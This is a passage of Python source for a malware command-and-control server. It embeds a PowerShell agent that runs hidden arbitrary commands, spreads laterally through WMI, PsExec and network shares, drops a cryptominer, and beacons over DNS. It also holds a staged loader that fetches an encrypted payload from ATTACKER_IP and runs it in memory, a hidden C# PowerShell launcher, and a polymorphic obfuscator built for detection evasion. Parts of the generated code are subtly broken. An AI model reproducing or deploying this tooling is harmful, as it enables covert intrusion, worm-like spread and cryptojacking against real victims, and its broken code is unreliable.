                $lastHttpCheckin = Get-Date # Update successful check-in time
                $httpSuccess = true

                $task = ""
                $taskRequestParams = @{
                    Uri = $taskuri
                    Method = 'GET'
                    ErrorActionStop = true
                    UseBasicParsing = true
                }
                if ($globalProxy) { $taskRequestParams.Proxy = $globalProxy }
                if ($globalUserAgent) { $taskRequestParams.Headers = @{'User-Agent'=$globalUserAgent} }

                $task_response = Invoke-WebRequestWithPinning @taskRequestParams
                $task = $task_response.Content

            } catch {
                Write-Host "HTTP communication failed: $($_.Exception.Message)"
                $task = "" # Ensure task is empty if there was an error
                $httpSuccess = false
            }
        } else {
            Write-Host "Skipping HTTP check-in. Next in $([System.Math]::Round($baseBeaconInterval - ($currentTime - $lastHttpCheckin).TotalSeconds, 0)) seconds."
        }

        # If HTTP failed or it's time for a periodic DNS beacon
        if (-not $httpSuccess -or ($currentTime - $lastDnsBeacon).TotalSeconds -ge $maxDnsBeaconInterval) { # Use max DNS interval for periodic beacon
            Write-Host "Attempting DNS beacon as fallback/periodic."
            $dnsResult = Send-DnsBeacon -AgentId $id -MessageType "tele" -Payload "$($telemetry.Substring(0, [System.Math]::Min(20, $telemetry.Length)))" -BeaconDomain $dnsBeaconDomain
            Write-Host $dnsResult
            $lastDnsBeacon = $currentTime # Update DNS beacon time
        }
        
        # Process task received from HTTP (if any)
        if ($task -ne "") {
            $dtask = Decrypt-String $script:key $task # Use updated key
            $res = ""
            if ($dtask.StartsWith("powershell_delivery")) {
                # This command is sent by C2 to tell loader to download main agent script.
                # The loader already has the logic. This is just a signal.
                # In a full impl, this might trigger a re-download/re-execution of the main agent script itself.
                # For now, it's more of a conceptual placeholder as the loader runs the main script once.
                $res = "Main PowerShell agent re-delivery initiated (if loader supports it)."
            } elseif ($dtask.StartsWith("stealth_initial_setup")) {
                # Perform stealthy initial setup tasks
                $setupOutput = @()
                $setupOutput += "Initial setup: Collecting basic system info..."
                $setupOutput += "Hostname: $(hostname)"
                $setupOutput += "OS Version: $(Get-WmiObject Win32_OperatingSystem | Select-Object Caption, OSArchitecture).Caption"
                $setupOutput += "Network Config: $(Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, DNSServer | Out-String)"
                $setupOutput += "Current User: $(whoami)"
                $setupOutput += "Last 5 System Events: $(Get-WinEvent -FilterHashtable @{LogName='System'; Level=2,3} -MaxEvents 5 -ErrorAction SilentlyContinue | Select-Object -Property TimeCreated,Id,LevelDisplayName,Message | Out-String)"
                
                # Placeholder for simple persistence (e.g., Scheduled Task) - NOT EXECUTED, for demonstration of intent
                # $setupOutput += "Attempting to create scheduled task for persistence (conceptual)..."
                # $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -File "C:\Path\To\Agent.ps1"'
                # $taskTrigger = New-ScheduledTaskTrigger -AtStartup
                # Register-ScheduledTask -TaskName "AgentPersistence" -Action $taskAction -Trigger $taskTrigger -Force | Out-Null
                
                $res = $setupOutput -join "`n"
            } elseif ($dtask.StartsWith("start_mining")) {
                $params = $dtask.Split("|")
                $intensity = $params[1] # Expected format: "start_mining|0.5"
                
                # Fetch the base64 encoded miner.js content
                $minerJsEncodedContent = (Invoke-WebRequestWithPinning -Uri $minerJsDownloadUri -UseBasicParsing -ErrorAction Stop).Content
                [System.IO.File]::WriteAllBytes("$env:TEMP\miner.js", [System.Convert]::FromBase64String($minerJsEncodedContent))
                
                $miningResult = Start-Mining -MinerJsPath "$env:TEMP\miner.js" -Intensity $intensity
                $res = $miningResult

            } elseif ($dtask.StartsWith("stop_mining")) {
                Stop-Process -Name (Decrypt-InMemoryString $encryptedMinerName $InMemoryXorKey) -Force -ErrorAction SilentlyContinue
                # No file to remove since it's now fileless
                $res = "Mining stopped"
            } elseif ($dtask.StartsWith("deploy_miner")) {
                # For fileless deployment, "deploy_miner" now just means ensuring the latest in-memory script is used
                # or could trigger a re-download of the base64 encoded version without running it immediately.
                # For simplicity, we'll confirm the command but it mostly relies on the next 'start_mining' to pull the latest.
                $res = "Miner redeploy signal received. Next start_mining will use latest fileless miner."
            } elseif ($dtask.StartsWith("cmd ")) {
                $command_to_exec = $dtask.Substring(4)
                try {
                    # Execute arbitrary shell command
                    # Using hidden window and redirecting output to NUL for stealth
                    $procPath = Decrypt-InMemoryString $encryptedCmdExe $InMemoryXorKey
                    $process = Start-Process -FilePath $procPath -ArgumentList "/c $command_to_exec" -NoNewWindow -PassThru -RedirectStandardOutput "NUL" -RedirectStandardError "NUL"
                    Wait-Process -InputObject $process -Timeout 60
                    $res = "Command execution attempted: $command_to_exec. Check logs for results."
                } catch {
                    $res = "Command execution failed: $($_.Exception.Message)"
                }
            } elseif ($dtask.StartsWith("wmi_exec|")) {
                # Format: wmi_exec|<target_ip>|<command>
                $parts = $dtask.Split("|", 3)
                if ($parts.Length -eq 3) {
                    $targetIp = $parts[1]
                    $commandToRun = $parts[2]
                    $res = Invoke-WMICmd -Target $targetIp -Command $commandToRun
                } else {
                    $res = "Invalid wmi_exec format. Expected 'wmi_exec|<target_ip>|<command>'."
                }
            } elseif ($dtask.StartsWith("psexec_exec|")) {
                # Format: psexec_exec|<target_ip>|<username>|<password>|<command>
                $parts = $dtask.Split("|", 5)
                if ($parts.Length -eq 5) {
                    $targetIp = $parts[1]
                    $username = $parts[2]
                    $password = $parts[3]
                    $commandToRun = $parts[4]
                    $res = Invoke-PsExecCmd -Target $targetIp -Username $username -Password $password -Command $commandToRun
                } else {
                    $res = "Invalid psexec_exec format. Expected 'psexec_exec|<target_ip>|<username>|<password>|<command>'."
                }
            } elseif ($dtask.StartsWith("propagate_share|")) {
                # Format: propagate_share|<source_path_on_agent>|<target_share_path>
                $parts = $dtask.Split("|", 3)
                if ($parts.Length -eq 3) {
                    $sourcePath = $parts[1]
                    $targetSharePath = $parts[2]
                    $res = Copy-ToNetworkShare -SourcePath $sourcePath -TargetPath $targetSharePath
                } else {
                    $res = "Error copying file to network share '$TargetPath': $($_.Exception.Message)"
                }
            } elseif ($dtask.StartsWith("start_worm_propagation")) {
                # This command triggers the worm-like behavior
                # The agent needs to discover targets and then deploy payload
                # This is a placeholder for complex logic like:
                # 1. Enumerate network (e.g., Get-ADComputer, Test-Connection -Ping)
                # 2. Identify vulnerable targets / targets with weak creds
                # 3. Attempt lateral movement (WMI/PsExec/Share) to deploy self/loader
                
                # For this basic implementation, it will simulate scanning and attempt to copy.
                $res = "Worm propagation initiated. Agent will attempt to discover and compromise targets."
                # Example: Scan local subnet (very noisy, for demo purposes)
                # $subnet = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Ethernet*'}).IPAddress.Split('.')[0..2] -join '.'
                # 1..254 | ForEach-Object {
                #     $targetIP = "$subnet.$_"
                #     Write-Host "Checking $targetIP"
                #     # This would then lead to trying WMI_EXEC or PROPAGATE_SHARE
                #     # For now, just logging the intent.
                # }
                
                # Placeholder for email/USB propagation:
                # if (Random -ge 0.5) { $res += " Also attempting email propagation." }
                # if (Random -ge 0.5) { $res += " Also attempting USB propagation." }

            } elseif ($dtask.StartsWith("set_egress_config")) {
                # This makes egress configuration real.
                # Expected format: "set_egress_config|type|value"
                # type can be "proxy" or "user_agent"
                $params = $dtask.Split("|")
                if ($params.Length -ge 3) {
                    $configType = $params[1]
                    $configValue = $params[2]
                    
                    if ($configType -eq "proxy") {
                        # Set a global proxy for all subsequent Invoke-WebRequest calls
                        # This impacts how the agent communicates with the C2
                        $globalProxy = $configValue
                        $res = "Egress config: Global proxy set to $globalProxy"
                    } elseif ($configType -eq "user_agent") {
                        # Set a global User-Agent for all subsequent Invoke-WebRequest calls
                        $globalUserAgent = $configValue
                        $res = "Egress config: Global User-Agent set to '$globalUserAgent'"
                    } else {
                        $res = "Egress config: Unknown type '$configType'."
                    }
                } else {
                    $res = "Egress config: Invalid format. Expected 'set_egress_config|type|value'."
                }
            } elseif ($dtask.StartsWith("set_beacon_params")) { # New command for dynamic beacon adjustment
                # Expected format: "set_beacon_params|<base_interval>|<jitter_percent>"
                $params = $dtask.Split("|")
                if ($params.Length -eq 3) {
                    $newBase = [double]$params[1]
                    $newJitter = [double]$params[2]
                    if ($newBase -ge 1 -and $newJitter -ge 0 -and $newJitter -le 1) {
                        $baseBeaconInterval = $newBase
                        $beaconJitterPercent = $newJitter
                        $res = "Beacon parameters updated: Base=$baseBeaconInterval, Jitter=$beaconJitterPercent"
                    } else {
                        $res = "Invalid beacon parameters. Base interval must be >=1, Jitter 0-1."
                    }
                } else {
                    $res = "Invalid set_beacon_params format. Expected 'set_beacon_params|<base>|<jitter>'."
                }
            }
            elseif ($dtask.StartsWith("send_dns_beacon")) {
                # This command is for manual triggering of a DNS beacon from C2.
                # The agent handles beaconing itself based on $dnsBeaconDomain.
                # This explicit task could be used for testing or forced beacons.
                $parts = $dtask.Split("|", 2)
                $beaconPayload = if ($parts.Length -ge 2) { $parts[1] } else { "manual" }
                $res = Send-DnsBeacon -AgentId $id -MessageType "manual" -Payload $beaconPayload -BeaconDomain $dnsBeaconDomain
            } elseif ($dtask -eq "test_pool") {
                $poolResult = Test-PoolConnectivity
                $res = $poolResult
            } else {
                $res = "Unknown command received."
            }

            # Only send result back via HTTPS if HTTPS is working
            if ($httpSuccess) {
                $data = Encrypt-String $script:key $res
                try {
                    # Send result, applying global egress config
                    $responseRequestParams = @{
                        Uri = $responseuri
                        Body = $data
                        ContentType = "text/plain; charset=utf-8"
                        Method = 'POST'
                        ErrorActionStop = true
                        UseBasicParsing = true
                    }
                    if ($globalProxy) { $responseRequestParams.Proxy = $globalProxy }
                    if ($globalUserAgent) { $responseRequestParams.Headers = @{'User-Agent'=$globalUserAgent} }
                    Invoke-WebRequestWithPinning @responseRequestParams | Out-Null
                } catch {
                    Write-Host "Failed to send HTTP task result: $($_.Exception.Message)"
                }
            } else {
                Write-Host "HTTP is down, not sending task result over HTTP. Result: $res"
            }
        }
        sleep $sleepInterval # Use the calculated random sleep interval
    }
}
"""

# Staged PowerShell Loader Template
STAGED_POWERSHELL_LOADER_SCRIPT = r"""
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

$ip = "ATTACKER_IP"
$port = "ATTACKER_PORT"
$id = "AGENT_ID"
$key = "AES_KEY"
$scheme = "https"
$certPubKeyHash = "CERT_PUBKEY_HASH"
$stagedPayloadPath = "C2_STAGED_PAYLOAD_PATH" # Path for chunked payload

function Invoke-WebRequestWithPinning {
    param (
        [string]$Uri,
        [string]$Method = 'GET',
        [string]$Body = $null,
        [string]$ContentType = $null,
        [switch]$UseBasicParsing = $true,
        [switch]$ErrorActionStop = false,
        [string]$Proxy = $null,
        [hashtable]$Headers = $null
    )

    $params = @{
        Uri = $Uri
        Method = $Method
        UseBasicParsing = $UseBasicParsing
    }
    if ($Body) { $params.Body = $Body }
    if ($ContentType) { $params.ContentType = $ContentType }
    if ($Proxy) { $params.Proxy = $Proxy }
    if ($Headers) { $params.Headers = $Headers }
    if ($ErrorActionStop) { $params.ErrorAction = 'Stop' } else { $params.ErrorAction = 'SilentlyContinue' }

    $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
        param($sender, $certificate, $chain, $sslPolicyErrors)
        if (-not $script:certPubKeyHash -or $script:certPubKeyHash -eq "") {
            return $true
        }
        $sha256 = New-Object System.Security.Cryptography.SHA256Managed
        $certRawData = $certificate.GetRawCertData()
        $x509Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certRawData)
        $publicKey = $x509Cert.PublicKey.RawData
        $publicKeyHash = [System.BitConverter]::ToString($sha256.ComputeHash($publicKey)).Replace("-", "").ToLowerInvariant()
        return ($publicKeyHash -eq $script:certPubKeyHash)
    }
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $callback

    try {
        $response = Invoke-WebRequest @params
        return $response
    } finally {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    }
}

$fullEncryptedPayload = [System.IO.MemoryStream]::new()
$chunkIndex = 0
$totalChunks = -1 # Will be updated by the first chunk header

Write-Host "Attempting to download staged payload for agent $id..."

while ($true) {
    try {
        $chunkUri = ($scheme + '://' + $ip + ':' + $port + ($stagedPayloadPath -replace "{agent_id}", $id -replace "{chunk_id}", $chunkIndex))
        Write-Host "Requesting chunk $chunkIndex from $chunkUri"
        $response = Invoke-WebRequestWithPinning -Uri $chunkUri -Method 'GET' -ErrorActionStop -UseBasicParsing
        
        $chunkContent = [System.Convert]::FromBase64String($response.Content)
        $headers = $response.Headers

        if ($headers.ContainsKey("X-Payload-Total-Chunks")) {
            $totalChunks = [int]$headers["X-Payload-Total-Chunks"]
        } else {
            Write-Warning "X-Payload-Total-Chunks header missing. Assuming single chunk or last chunk."
        }

        $fullEncryptedPayload.Write($chunkContent, 0, $chunkContent.Length)
        Write-Host "Received chunk $chunkIndex. Current payload size: $($fullEncryptedPayload.Length) bytes."

        $chunkIndex++
        if ($totalChunks -ne -1 -and $chunkIndex -ge $totalChunks) {
            Write-Host "All chunks received ($chunkIndex of $totalChunks)."
            break
        }
        # Small delay between chunks to avoid overwhelming the server or network
        Start-Sleep -Milliseconds 100
    } catch {
        Write-Error "Failed to download chunk $chunkIndex: $($_.Exception.Message)"
        # Implement retry logic or exit
        Start-Sleep -Seconds 5 # Wait before retrying
        if ($chunkIndex -eq 0) { # If first chunk fails, exit.
            Write-Error "Failed to download initial payload chunk. Exiting loader."
            exit
        }
    }
}

if ($fullEncryptedPayload.Length -gt 0) {
    try {
        $encryptedB64 = [System.Convert]::ToBase64String($fullEncryptedPayload.ToArray())
        Write-Host "Decrypting full payload..."
        $decryptedScript = Decrypt-String $key $encryptedB64
        Write-Host "Executing decrypted payload..."
        Invoke-Expression $decryptedScript
    } catch {
        Write-Error "Failed to decrypt or execute main payload: $($_.Exception.Message)"
    }
} else {
    Write-Error "No payload received. Exiting loader."
}
"""

# C# source code for the PowerShell wrapper
def generate_csharp_powershell_wrapper_source(powershell_script_base64, output_filename="Launcher.cs"):
    """
    Generates a C# source file for a PowerShell script wrapper.
    This C# executable, when compiled and run, will decode and execute the given
    base64-encoded PowerShell script in memory.
    """
    csharp_code_template = f"""
using System;
using System.Diagnostics;
using System.Text;
using System.IO;
using System.Reflection; // Required for Assembly.Load

public class Launcher
{{
    public static void Main(string[] args)
    {{
        // Base64 encoded PowerShell script to execute
        string encodedScript = "{powershell_script_base64}";
        
        try
        {{
            byte[] data = Convert.FromBase64String(encodedScript);
            string script = Encoding.UTF8.GetString(data);

            // Create a new PowerShell process
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell.exe";
            // -NoProfile: Does not load the current user's profile.
            // -WindowStyle Hidden: Hides the PowerShell window.
            // -EncodedCommand: Specifies a base-64-encoded string version of a command.
            //                  Use this parameter to send commands that require complex quoted,
            #                  nested strings.
            // -NonInteractive: Does not present an interactive prompt to the user.
            startInfo.Arguments = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -EncodedCommand {{Convert.ToBase64String([System.Text.Encoding]::Unicode.GetBytes(script))}}";
            
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.CreateNoWindow = true;

            using (Process process = Process.Start(startInfo))
            {{
                // Optionally read output/error (can be commented out for stealth)
                // string output = process.StandardOutput.ReadToEnd();
                // string error = process.StandardError.ReadToEnd();
                // Console.WriteLine("Output: " + output);
                // Console.WriteLine("Error: " + error);
                
                process.WaitForExit(); // Wait for the PowerShell process to exit
            }}
        }}
        catch (Exception ex)
        {{
            // For production, this should log to a file or remote C2.
            // Console.WriteLine("Error: " + ex.Message);
        }}
    }}
}}
"""
    output_path = os.path.join(LAUNCHER_SOURCE_DIR, output_filename)
    try:
        with open(output_path, "w") as f:
            f.write(csharp_code_template)
        log_event('info', f"C# PowerShell wrapper source generated at: {output_path}")
        return output_path
    except Exception as e:
        log_event('error', f"Failed to write C# launcher source: {e}", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        return None

def generate_polymorphic_powershell(agent_id, aes_key, current_miner_process_name):
    """Generates a dynamically obfuscated PowerShell agent script (the main payload)."""
    ps_script = VENOM_POWERSHELL_AGENT_SCRIPT
    
    # Use config from server
    ps_script = ps_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
    ps_script = ps_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
    
    # Use agent-specific ID and AES key
    ps_script = ps_script.replace("_AGENT_ID_PLACEHOLDER_", agent_id)
    ps_script = ps_script.replace("_AES_KEY_PLACEHOLDER_", aes_key)

    # Inject the current process name for the miner into the PowerShell script
    ps_script = ps_script.replace("CURRENT_MINER_PROCESS_NAME", current_miner_process_name)

    # Generate a random XOR key for in-memory string obfuscation
    in_memory_xor_key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()', k=random.randint(16, 32)))
    ps_script = ps_script.replace("RANDOM_XOR_KEY_PLACEHOLDER", in_memory_xor_key)


    # Inject DNS beacon specific configurations
    ps_script = ps_script.replace("DNS_BEACON_DOMAIN", CONFIG["DNS_BEACON_DOMAIN"])
    # ps_script = ps_script.replace("DNS_BEACON_INTERVAL", str(CONFIG["DNS_BEACON_INTERVAL"])) # This is a Python-side config, not for PS agent directly

    # Inject beacon jitter and randomization parameters
    ps_script = ps_script.replace("BASE_BEACON_INTERVAL", str(CONFIG["BASE_BEACON_INTERVAL"]))
    ps_script = ps_script.replace("BEACON_JITTER_PERCENT", str(CONFIG["BEACON_JITTER_PERCENT"]))
    ps_script = ps_script.replace("MAX_HTTP_BEACON_INTERVAL", str(CONFIG["MAX_HTTP_BEACON_INTERVAL"]))
    ps_script = ps_script.replace("MAX_DNS_BEACON_INTERVAL", str(CONFIG["MAX_DNS_BEACON_INTERVAL"]))

    # Inject C2 Profile Paths
    ps_script = ps_script.replace("C2_REGISTER_PATH", get_c2_path("register", "{AGENT_ID}").replace("{AGENT_ID}", "$id"))
    ps_script = ps_script.replace("C2_TASK_PATH", get_c2_path("task", "{AGENT_ID}").replace("{AGENT_ID}", "$id"))
    ps_script = ps_script.replace("C2_RESULTS_PATH", get_c2_path("results", "{AGENT_ID}").replace("{AGENT_ID}", "$id"))
    ps_script = ps_script.replace("C2_TELEMETRY_PATH", get_c2_path("telemetry", "{AGENT_ID}").replace("{AGENT_ID}", "$id"))
    ps_script = ps_script.replace("C2_MINER_JS_PATH", get_c2_path("miner_js")) # No agent_id for static miner.js

    # Inject the certificate public key hash for pinning
    if CERT_PUBKEY_HASH:
        ps_script = ps_script.replace("CERT_PUBKEY_HASH", CERT_PUBKEY_HASH)
    else:
        # If pinning is not possible, ensure the variable is empty or commented out
        ps_script = ps_script.replace('$certPubKeyHash = "CERT_PUBKEY_HASH"', '$certPubKeyHash = "" # Certificate pinning disabled')

    # Dynamic variable renaming
    var_map = {
        "Create-AesManagedObject": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Encrypt-String": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Decrypt-String": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Encrypt-InMemoryString": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20))),
        "Decrypt-InMemoryString": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20))),
        "Get-Telemetry": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))),
        "Invoke-WebRequestWithPinning": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20))),
        "Send-DnsBeacon": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20))), # New function for DNS beacon
        "Invoke-WMICmd": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # New function for WMI exec
        "Invoke-PsExecCmd": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # New function for PsExec
        "Copy-ToNetworkShare": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # New function for share prop
        "Check-NodeJsInstalled": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # From patch
        "Install-NodeJsStealthily": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # From patch
        "Test-PoolConnectivity": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # From patch
        "Start-Mining": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15))), # From patch, adjusted
        "$ip": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$port": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$id": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$key": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$scheme": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$certPubKeyHash": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$reguri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(7, 12)))}",
        "$name": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$taskuri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(7, 12)))}",
        "$responseuri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(9, 14)))}",
        "$telemetryuri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(9, 14)))}",
        "$task": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$dtask": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 11)))}",
        "$res": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(4, 9)))}",
        "$data": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$cpu": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 7)))}",
        "$mem": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 7)))}",
        "$minerProc": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$hashRate": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$status": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 11)))}",
        "$securityEvents": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$systemEvents": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$tzOffset": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$process": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))}",
        "$output": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 11)))}",
        "$globalProxy": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$globalUserAgent": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$telemetryRequestParams": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$taskRequestParams": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$responseRequestParams": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$configType": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$configValue": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$dnsBeaconDomain": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$baseBeaconInterval": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$beaconJitterPercent": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$maxHttpBeaconInterval": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$maxDnsBeaconInterval": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$sleepInterval": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$lastDnsBeacon": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$httpSuccess": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$lastHttpCheckin": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$currentTime": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$dnsResult": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$payloadHash": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$subdomain": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$fqdn": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$minerJsDownloadUri": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$minerJsEncodedContent": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$miningResult": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$nodeCheckPath": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$installResult": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$encryptedResult": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$errorDetails": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
        "$poolResult": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 15)))}",
        "$encryptedTelemetry": f"${''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 20)))}",
    }
    for old, new in var_map.items():
        ps_script = re.sub(r'\b' + re.escape(old) + r'\b', new, ps_script)

    # Injecting random dead code functions
    dead_code_functions = [
        lambda: f"function {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} {{ $x = {random.randint(1,100)}; return $x * {random.randint(1,10)}; }}",
        lambda: f"function {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} {{ $arr = @({random.randint(1,10)}, {random.randint(11,20)}); $arr | ForEach-Object {{ Write-Host $_ }}; }}",
        lambda: f"function {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} {{ If ({random.choice([True,False])}) {{ Write-Host '{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}' }}; }}"
    ]
    for _ in range(random.randint(1, 3)):
        ps_script += "\n" + random.choice(dead_code_functions)() + "\n"

    # Add a random comment to the beginning
    ps_script = f"# {''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=random.randint(20, 50))).strip()}\n" + ps_script
    
    return ps_script


def generate_staged_powershell_loader(agent_id, aes_key):
    """Generates the small, initial PowerShell loader script for staged payload delivery."""
    loader_script = STAGED_POWERSHELL_LOADER_SCRIPT
    
    loader_script = loader_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
    loader_script = loader_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
    loader_script = loader_script.replace("AGENT_ID", agent_id)
    loader_script = loader_script.replace("AES_KEY", aes_key)
    loader_script = loader_script.replace("C2_STAGED_PAYLOAD_PATH", get_c2_path("staged_payload", "{agent_id}", "{chunk_id}").replace("{agent_id}", "$id").replace("{chunk_id}", "$chunkIndex"))

    if CERT_PUBKEY_HASH:
